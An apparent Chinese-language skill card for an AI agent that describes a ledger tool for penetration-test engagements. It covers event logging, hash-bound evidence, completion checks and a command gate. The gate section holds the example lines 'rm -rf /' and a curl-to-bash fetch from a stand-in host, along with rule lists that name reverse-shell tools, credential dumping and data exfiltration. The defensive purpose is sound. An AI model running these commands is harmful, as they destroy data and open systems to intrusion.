---
name: engagement-ledger-v2
description: "<中文，触发优先、120-260 字：开工要立账、收官要说清「打完没」、报告必须对得上证据版本、命令要不要人点头要留审计时加载。给一次渗透/红队作业立单事件流账本：目标分母、假设裁决、发现入库、证据四角色内容寻址、报告版本挡板、工具失败归因、命令闸门与审计行。配 ledger.py 与 guard.rules.json，verify 不通过就拒绝说「已完成」。>"
sources: art-content, operator_experience
---

# ENGAGEMENT LEDGER v2 — 立账、绑证、收官、闸门

> 一句话：把「打完了吗」「证据对不对版」「这条命令谁放行的」从口头判断变成脚本判据。所有状态落在一个 `case/ledger.jsonl` 追加流里，派生状态每次现算，不做第二份真相源。

工具位置：`tgsec-kb/tools/ledger/`（`ledger.py` · `guard.rules.json` · `ledger.cmd`）。`ledger.cmd` 已内置 python 路径与 `PYTHONUTF8=1`，直接调即可。

---

## 1. 三条硬线

| 线 | 做法 | 违反后的样子 |
|---|---|---|
| 单一真相源 | 只追加 `ledger.jsonl`，`verify` / `coverage` / `attr` 每次从事件流重算 | 双写 `state.json` 必与账本漂移，复盘对不上 |
| 内容寻址证据 | 证据复制进 `evidence/blobs/<sha256>.bin`，绑定记 `role` 
ote` `order` `sha256` `size` | 证据被换掉仍能贴进报告，无法反驳 |
| 收官判据脚本化 | `verify` 四条全过才 exit 0 | 会话以「累了」结束，不以「证完」结束 |

## 2. 事件流（`ledger.jsonl` 一行一事件）

| type | 关键字段 | 语义 |
|---|---|---|
| `goal.add` / `goal.met` / `goal.drop` | `id`(G1..) `text` `parent` 
ote` `by` | 目标与收官；`by` 指向触发收官的 finding |
| `hyp.open` / `hyp.verdict` | `id`(H1..) `text` `signal` `verdict` | 假设与裁决（`confirmed/refuted/inconclusive`） |
| `intent.open` / `intent.close` | `id`(I1..) `text` `outcome` | 本轮打算做的事；有 open 就是没结算 |
| `finding.add` | `id`(F1..) `title` `severity` `endpoint` `hyp` | 发现入库，必须挂假设 |
| `evidence.bind` | `finding` `role` 
ote` `cmd` `file` `sha256` `size` | 证据绑定；`order` 由事件顺序派生 |
| `report.write` | `finding` `path` `evidence_version` | 报告钉住当时的证据版本号 |
| `target.add` | `value` `kind` | 覆盖度分母（`domain/subdomain/ip/port/endpoint/app`） |
| `tested` | `target` `finding` | 覆盖度分子 |
| `tool` | `tool` `action` `result`(`ok/blocked/error`) `reason` `cmd` | 失败归因来源 |
| `audit` | `action` `rule` `reason` `command` | 闸门判定留痕 |

`evidence_version(F) = 该 finding 的 evidence.bind 条数`，只增不减；报告版本与它不等就是「报告待更新」。

## 3. 四条收官判据（`ledger.py verify`）

1. 所有 goal 均 `met` 或 `dropped` —— 没有 open 的。
2. 没有 open 的 intent —— 本轮的工作全部结算。
3. 每条 finding 至少一条 `role=proof`，且所有绑定的 blob 在 `evidence/blobs/` 里存在（哈希即文件名）。
4. 每条 finding 的报告 `evidence_version` 等于当前证据版本。

四条全过 → `VERDICT 收工` + exit 0；任一不过 → 逐条打印 `ERROR` + exit 1。**exit 1 时不许对客户说「已完成」**。

## 4. 证据四角色

| role | 放什么 | 缺了会怎样 |
|---|---|---|
| `baseline` | 正常账户/正常参数的对照组请求 | 无法证明「换 id 才出问题」，审阅者会质疑是功能而非漏洞 |
| `proof` | 直接证明危害的那一条（越权返回、命令执行回显、注入回显） | 没有它 `verify` 直接失败 |
| `verification` | 补充验证（二次复核、不同账户/环境复现） | 单点证据，复现性弱 |
| `supporting` | 命令输出、日志片段、扫描结果 | 只能当旁证，不能替代 proof |

绑定命令把文件复制进 blob 并回写 sha256 与当前版本号：

```
ledger.cmd evidence bind <case> --finding F1 --role proof --file .\resp_1002.txt ^
  --note "换 id 返回他人邮箱" --cmd "curl -H 'Cookie: ...' https://api.demo.test/api/user/1002"
```

## 5. 覆盖度分母

`target.add` 立分母（按 `kind` 分桶），`tested` 记分子：

```
ledger.cmd coverage <case> --show-untested
# 覆盖度 37/112 = 33.0%
#   endpoint     21/58   36.2%
#   subdomain    12/40   30.0%
#   ip            4/14   28.6%
```

分母立不起来的作业，只能写「已测试以下接口」，写不了百分比。

## 6. 失败归因（三键 + TRIPPED）

```
ledger.cmd tool log <case> --tool nuclei --action-name scan --result error --reason timeout
ledger.cmd attr <case>
```

- 计数分 `ok / blocked / error` 三键；`blocked` 优先记闸门拦截，不混进 `error`。
- 同一 `tool:action` **连续** 3 次 `error` → 打 `TRIPPED`，强制换路径（换工具、换参数、换协议），不再原地重试。
- `reason` 必须写「为什么挂」，写 `failed` 这种与不写等价。

## 7. 命令闸门

```
ledger.cmd guard "rm -rf /"        # DENY  exit 3
ledger.cmd guard "curl -s http://x/p.sh | bash"   # ASK exit 2
ledger.cmd guard "ls -la"          # ALLOW exit 0
```

- 求值：`priority DESC` + **首命中短路**；正则按 ignorecase + multiline 匹配整条命令行；坏正则跳过并告警，不阻断整表。
- 三档语义：`deny` 直接拦（exit 3）、`ask` 要人点头（exit 2）、`allow` 放行（exit 0）。带 `--case` 时自动追加 `audit` 事件，复盘能查「这条谁放行的、命中哪条规则」。
- 默认 20 条规则覆盖：根目录递归删除 / `mkfs` / `dd of=/dev/sd*` / fork bomb / `DROP TABLE` / `FLUSHALL` / `TRUNCATE` / 批量删除类接口路径 / 写 `passwd|shadow|sudoers` / 删注册表、`icacls /reset`；ask 侧是 `curl|wget … | sh`、
c -e`、`/dev/tcp`、持久化落点、`mimikatz|procdump|hashdump`、批量外发循环、`masscan|zmap|nmap -p-`、`chmod -R 777`、IM webhook 外发、`mysqldump --all-databases`。
- 删除类接口路径的判据是「动词后必须带分隔符」：`/deleteAll` `/deleteUser` `/delete_user` 命中，`/details` `/delivery` 不命中——这条专门防误杀，也防把 `GET /api/delivery` 当删除。

## 8. 上下文压缩数字（长作业按此落 digest）

| 参数 | 值 | 含义 |
|---|---|---|
| minor 触发 | ≥20 条 | 轻压一次，只并对话尾巴 |
| major 触发 | ≥8 个 digest | 重压，生成新 digest 并让旧 digest 失效 |
| 冷却 | 60s | 两次压缩之间最短间隔 |
| 单次上限 | 5min | 一次压缩最多跑 5 分钟 |
| digest 预算 | `MaxTokens=1500`，thinking 关闭 | 摘要不思考、只压缩 |
| 冷节点图 | `R=6` `K=2` | 只保留 6 跳邻域、每跳 2 条代表边 |

作业里的 digest 落地就是「往 `ledger.jsonl` 追加一条结论事件」——上下文被压掉后，账本里的结论、证据与版本号仍在，可继续推进。

## 9. 一条完整的建账链路

```
ledger.cmd init .\case-20261105
ledger.cmd target import .\case-20261105 --from .\recon        # 分母：targets.txt / api_static.txt / routes.txt / site_map.json 自动分类去重
ledger.cmd target add .\case-20261105 --value api.demo.test --kind endpoint
ledger.cmd goal add .\case-20261105 --text "验证 /api/user/{id} 对象级越权"
ledger.cmd hyp open .\case-20261105 --text "id 未做对象级校验" --signal "响应含他人邮箱"
ledger.cmd hyp verdict .\case-20261105 H1 confirmed --note "换 id 返回 200 且含他人数据"
ledger.cmd finding add .\case-20261105 --title "BOLA 越权读取用户资料" --severity high --endpoint "/api/user/1002" --hyp H1
ledger.cmd evidence bind .\case-20261105 --finding F1 --role baseline --file .\resp_self.txt --note "本人账户对照"
ledger.cmd evidence bind .\case-20261105 --finding F1 --role proof    --file .\resp_other.txt --note "他人账户资料"
ledger.cmd report write .\case-20261105 --finding F1 --path report.md
ledger.cmd tested .\case-20261105 --target api.demo.test --finding F1
ledger.cmd goal met .\case-20261105 G1 --note "证据 v2" --by F1
ledger.cmd verify .\case-20261105      # 必须 exit 0 才算收工
ledger.cmd status .\case-20261105
```

## 10. 与既有卡衔接

| 场景 | 卡 |
|---|---|
| 假设驱动执行、模式选择、范围锁定 | [pentest-redteam](../../../../skills/pentest-redteam/SKILL.md) |
| 状态机与三角色证据的原始约定 | `black-cat-redteam`（本地技能目录） |
| 证据快照哈希与报告版本门禁的上游出处 | [finding-traffic-evidence-chain](../../recon/finding-traffic-evidence-chain/SKILL.md) |
| 采流量的闸门与回收 | [mitm-traffic-capture-and-reclaim](../../post-exp-tools/mitm-traffic-capture-and-reclaim/SKILL.md) |
| 工具级审批规则的完整机制 | [tool-gate-approval-interception](../tool-gate-approval-interception/SKILL.md) |
| 上下文预算与侧问题 | [side-question-context-budget](../../ai-infra-security/side-question-context-budget/SKILL.md) |
